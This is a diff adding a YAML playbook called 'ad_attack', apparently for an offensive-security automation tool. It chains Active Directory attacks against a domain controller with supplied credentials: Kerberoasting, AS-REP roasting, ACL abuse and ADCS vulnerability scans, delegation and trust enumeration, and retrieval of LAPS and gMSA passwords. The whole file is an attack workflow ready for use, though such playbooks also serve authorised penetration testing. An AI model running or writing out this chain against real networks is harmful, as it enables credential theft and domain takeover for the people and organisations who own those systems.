@@ -1,0 +1,108 @@
+name: ad_attack
+description: Active Directory enumeration and attack chain
+author: PhantomShell
+version: "5.2"
+
+vars:
+  dc: "{{ dc_ip }}"
+  domain: "{{ domain_name }}"
+  username: "{{ ad_user }}"
+  password: "{{ ad_pass }}"
+
+steps:
+  - name: Domain Enumeration
+    command: ad_enum
+    args:
+      dc: "{{ dc }}"
+      domain: "{{ domain }}"
+      username: "{{ username }}"
+      password: "{{ password }}"
+    store: domain_info
+
+  - name: Kerberoasting
+    command: ad_kerberoast
+    args:
+      dc: "{{ dc }}"
+      domain: "{{ domain }}"
+      username: "{{ username }}"
+      password: "{{ password }}"
+    store: kerberoast
+    fail_fast: false
+
+  - name: AS-REP Roasting
+    command: ad_asreproast
+    args:
+      dc: "{{ dc }}"
+      domain: "{{ domain }}"
+      username: "{{ username }}"
+      password: "{{ password }}"
+    store: asreproast
+    fail_fast: false
+
+  - name: ACL Abuse Scan
+    command: ad_acl_scan
+    args:
+      dc: "{{ dc }}"
+      domain: "{{ domain }}"
+      username: "{{ username }}"
+      password: "{{ password }}"
+    store: acl_abuse
+    fail_fast: false
+
+  - name: Delegation Enumeration
+    command: ad_delegation
+    args:
+      dc: "{{ dc }}"
+      domain: "{{ domain }}"
+      username: "{{ username }}"
+      password: "{{ password }}"
+    store: delegation
+
+  - name: ADCS Vulnerability Scan
+    command: ad_adcs
+    args:
+      dc: "{{ dc }}"
+      domain: "{{ domain }}"
+      username: "{{ username }}"
+      password: "{{ password }}"
+    store: adcs
+    fail_fast: false
+
+  - name: LAPS Passwords
+    command: ad_laps
+    args:
+      dc: "{{ dc }}"
+      domain: "{{ domain }}"
+      username: "{{ username }}"
+      password: "{{ password }}"
+    store: laps
+    fail_fast: false
+
+  - name: gMSA Passwords
+    command: ad_gmsa
+    args:
+      dc: "{{ dc }}"
+      domain: "{{ domain }}"
+      username: "{{ username }}"
+      password: "{{ password }}"
+    store: gmsa
+    fail_fast: false
+
+  - name: Trust Enumeration
+    command: ad_trusts
+    args:
+      dc: "{{ dc }}"
+      domain: "{{ domain }}"
+      username: "{{ username }}"
+      password: "{{ password }}"
+    store: trusts
+
+  - name: Password Policy
+    command: ad_passwords
+    args:
+      dc: "{{ dc }}"
+      domain: "{{ domain }}"
+      username: "{{ username }}"
+      password: "{{ password }}"
+      action: policy
+    store: password_policy
